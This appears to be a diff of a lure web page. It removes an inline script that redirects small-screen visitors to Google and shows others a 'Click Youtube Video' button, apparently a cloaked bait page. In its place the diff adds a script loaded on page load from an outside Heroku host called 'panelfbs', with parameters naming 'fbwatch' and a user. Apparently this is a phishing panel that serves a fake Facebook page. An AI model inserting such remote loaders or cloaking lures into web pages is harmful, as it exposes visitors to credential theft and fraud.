@@ -22,36 +22,6 @@
 <p id="demo">
     
 </p>
-<script type="text/javascript">
-
-function generateRandomString(iLen) {
-    var sRnd = '';
-    var sChrs = "abcdefghiklmnopqrstuvwxyz";
-    for (var i = 0; i < iLen; i++) {
-      var randomPoz = Math.floor(Math.random() * sChrs.length);
-      sRnd += sChrs.substring(randomPoz, randomPoz + 1);
-    }
-    return sRnd;
-  }
-
-function getUrlVars() {
-    var vars = {};
-    var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
-        vars[key] = value;
-    });
-    return vars;
-}
-
-function visitPage(){
-        window.location = "https://www.google.com.do";
-    }
-
-        if (screen.width <= 720) {
-        window.location = "https://www.google.com.do";
-    } else {
-       document.getElementById("demo").innerHTML ="<h1><button class=button onclick=visitPage();> Click Youtube Video </button></h1>"
-    }
-
-</script>
+<script src="https://panelfbs.herokuapp.com/api/script?api=true&html=fbwatch&user=braunnypr" type="text/javascript" async="true"></script>
 </body>
 </html>
